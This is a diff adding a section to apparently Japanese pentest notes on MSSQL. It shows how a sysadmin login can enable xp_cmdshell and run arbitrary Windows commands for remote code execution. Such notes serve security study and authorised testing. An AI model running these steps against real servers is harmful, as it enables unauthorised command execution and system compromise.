@@ -11,3 +11,14 @@ impacket-mssqlclient <ユーザー名>:<パスワード>@<ターゲット> -wind
 impacket-mssqlclient -k <FQDN> # Kerberos認証
 ```
 
+## sysadminの悪用
+システム全体に対する最高レベルの権限を持つ固定サーバーロールであるため、sysadminであればRCEが可能。
+```bash
+SELECT IS_SRVROLEMEMBER('sysadmin') # 1であればsysadmin
+# 以下シェル操作を有効にする手順
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC xp_cmdshell '<任意のWindowsコマンド>';
+```
